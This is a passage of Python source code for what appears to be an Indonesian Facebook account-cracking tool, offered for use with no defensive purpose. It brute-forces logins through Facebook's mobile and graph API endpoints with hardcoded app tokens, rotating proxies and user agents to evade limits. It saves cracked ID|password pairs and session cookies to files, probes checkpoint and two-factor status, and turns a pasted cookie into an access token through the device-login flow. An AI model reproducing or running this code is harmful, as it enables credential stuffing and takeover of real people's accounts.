      po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "c_user" in ses.cookies.get_dict().keys():
        if 'no' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# Method graph api
def metodV7(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  ses = requests.Session()
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des) 
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks4://'+nip}
      link = ses.get('https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1')
      data={
        "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
        "sdk_version": {random.randint(1,26)},
        "email": idf,
        "locale": "en_US",
        "password": pw,
        "sdk": "android",
        "generate_session_cookies": "1",
        "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
      }
      head={
        "Host": "graph.facebook.com",
        "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
			  "x-fb-http-engine": "Liger"
      }
      po = ses.post("https://graph.facebook.com/auth/login", data=data, headers=head, allow_redirects=False,proxies=proxs).json()
      if "checkpoint" in ses.cookies.get_dict():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "session_key" in po:
        if 'no' in appNdyZ:
          ok+=1
          cokz = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
          ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
          kuki = f"sb={ssbb};{cokz}"
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          cokz = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
          ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
          kuki = f"sb={ssbb};{cokz}"
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f' [+] Akun Tap Yess Cek Di Mbasic                   '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f' [+] Akun Terpasang A2F                    '
				else:
					akun += f' [+] Akun Tidak Checkpoint Cek Di Mbasic                  '
			else:
				akun += f' [+] Terdapat {len(opsi)} Opsi Checkpoint :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f' [+] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f' [+] Kata Sandi Salah Kemungkinan Anda Terkena Spam Ip                  '
	print(akun)

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Coki Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	gubluk(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\t[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\t[bold white][+[/][bold white]][/] [bold white]Status : [bold green]Premium[/][/] ',width=100,padding=(0,6),title=f"[bold green]Profile Tumbal",style=f"bold purple"))
	gubluk(panel(f"[bold white][[bold cyan]01[bold white]] Crack Public\n[bold white][[bold cyan]02[bold white]] Crack Massal[bold white]\n[bold white][[bold cyan]03[bold white]] Result[bold white]\n[[bold cyan]00[bold white]] [bold red]Delete Coki[bold white]",width=35,title=f"[bold green]List Menu",style=f"bold purple"))
	_NdyZz = input(f' ╰─  Opsi Crack : ')
	if _NdyZz in ['1','01']:
		Ndy_FromFr_dump()
	elif _NdyZz in ['2','02']:
		Ndy_FromMs_dump()
	elif _NdyZz in ['3','03']:
	  result()
	elif _NdyZz in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+] {m}Sukses Logout/Hapus Coki')
		login()
	else:
		print(' [+] Pilih Yang Bener ')
		exit()

def login_cokiNdyZ():
  try:
    gubluk(pan('[bold white]Disarankan Untuk Menggunakan coki Yang Masih Fresh Untuk Melakukan Crack Account',width=100,padding=(0,8),style=f"bold purple"))
    your_coki = input(' ╰─  Masukkan cooki : ')
    ses.headers.update(
      {
        'content-type': 'application/x-www-form-urlencoded',
      }
    )
    data = {
      'access_token':'1348564698517390|007c0a9101b9e1c8ffab727666805038',
      'scope': ''
    }
    response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
    code, user_code = response['code'], response['user_code']
    verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
    ses.headers.pop(
      'content-type'
    )
    ses.headers.update(
      {
        'sec-fetch-mode': 'navigate',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
        'sec-fetch-site': 'cross-site',
        'Host': 'm.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-dest': 'document',
      }
    )
    response2 = ses.get(verification_url, cookies = {'cookie': your_coki}).text
    if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
      exit('\n[!] cookie invalid')
    else:
      action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
      fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
      jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
      data = {
        'fb_dtsg': fb_dtsg,
        'jazoest': jazoest,
        'qr': 0,
        'user_code': user_code,
      }
      ses.headers.update(
        {
          'origin': 'https://m.facebook.com',
          'referer': verification_url,
          'content-type': 'application/x-www-form-urlencoded',
          'sec-fetch-site': 'same-origin',
        }
      )
      response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_coki})
      if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
        ses.headers.pop(
          'content-type'
        )
        ses.headers.pop(
          'origin'
        )
        response4 = ses.post(response3.url, data = data, cookies = {'cookie': your_coki}).text
        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
        ses.headers.update(
          {
            'origin': 'https://m.facebook.com',
            'referer': response3.url,
            'content-type': 'application/x-www-form-urlencoded',
          }
        )
        data = {
          'fb_dtsg': fb_dtsg,
          'jazoest': jazoest,
          'scope': scope,
          'display': display,
          'user_code': user_code,
          'logger_id': logger_id,
          'auth_type': auth_type,
          'encrypted_post_body': encrypted_post_body,
          'return_format[]': return_format,
        }
        response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_coki}).text
        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
        ses.headers.pop(
          'content-type'
        )
        ses.headers.pop(
          'origin'
        )
        ses.headers.update(
          {
            'referer': 'https://m.facebook.com/',
          }
        )
        response6 = ses.get(windows_referer, cookies = {'cookie': your_coki}).text
        if 'Sukses!' in str(response6):
          ses.headers.update(
            {
              'sec-fetch-mode': 'no-cors',
              'referer': 'https://graph.facebook.com/',
              'Host': 'graph.facebook.com',
              'accept': '*/*',
              'sec-fetch-dest': 'script',
              'sec-fetch-site': 'cross-site',
            }
          )
          response7 = ses.get(status_url, cookies = {'cookie': your_coki}).text
          access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
          tokenw = open(".token.txt", "w").write(access_token)
          cokiew = open(".cok.txt", "w").write(your_coki)
          print(f'\n{H}login berhasil, jalankan {M}python NdyZz.py{x_d}')
      else:
        exit('\n[+] login gagal')
  except Exception as e:
    print('\n [+] Coki Invalid')
    os.system('rm -rf .cok.txt && rm -rf .token.txt')
    print(e)
    exit()

def result():
	gubluk(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=40,padding=(0,2),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold purple"))
	kz = input(f' ╰─  opsi : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(3)
			pass
		if len(vin)==0:
			print(' [+] Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			pass
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'\t{P}['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x_d)
				else:
					lol.update({str(cih):str(isi)})
					print(f'\t{P}['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x_d)
			geeh = input(f' ╰─ Select : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				pass
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'[+] ID|PASSWORD : {cpkuni[0]}|{cpkuni[1]}'
				gubluk(nel(cpkuh,style="bold yellow",width=60,padding=(0,2)))
				nocp +=1
			input(f'\n{x_d}[ Enter ]')
			pass
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(4)
			pass
		if len(vin)==0:
			print(' [+] Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			pass
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'\t{P}['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x_d)
				else:
					lol.update({str(cih):str(isi)})
					print(f'\t{P}['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x_d)
			geeh = input(' ╰─ opsi : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener')
				pass
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				pass
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'[+] ID|PASSWORD : {cpkuni[0]}|{cpkuni[1]}'
				gubluk(nel(cpkuh,style="purple",width=60,padding=(0,2)))
				print(f'\t>>{U} UA : {P}{cpkuni[2]}')
				nocp +=1
			input(f'\n{x_d}[ Enter ]')
			pass
	else:
		print(' [+] Pilih Yang Bener')
		exit()

def loginNdyZz():
	os.system('clear')
	banner()
	gubluk(panel(f"[bold white][[bold cyan]01[bold white]] Login Coki\n[[bold cyan]02[bold white]] Result",width=40,title=f"[bold green]Menu",padding=(0,2),style=f"bold purple"))
	inp_NdyZ = input(f' ╰─  Opsi Menu : ')
	if inp_NdyZ in ['1','01']:
		login_cokiNdyZ()
	elif inp_NdyZ in ['2','02']:
		result()
	else:
		print(' [+] Pilih Yang Bener ')
		time.sleep(5)
		exit()

def login():
  try:
    token = open('.token.txt','r').read()
    coke = open('.cok.txt','r').read()
    tokenme.append(token)
    try:
      sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenme[0], cookies={'cookie':coke})
      sy2 = json.loads(sy.text)['name']
      sy3 = json.loads(sy.text)['id']
      menu(sy2,sy3)
    except KeyError:
      loginNdyZz()
    except requests.exceptions.ConnectionError:
      li = ' [+] Problem Internet Connection, Check And Try Again'
      lo = mark(li, style='red')
      sol().print(lo, style='cyan')
      exit()
  except IOError:
    loginNdyZz()
  
if __name__=='__main__':
  try:os.mkdir('DUMP-NdyZz')
  except:pass
  try:os.mkdir('OK')
  except:pass
  try:os.mkdir('CP')
  except:pass
  try:os.system('touch .prox.txt')
  except:pass
  try:os.system('clear')
  except:pass
  login()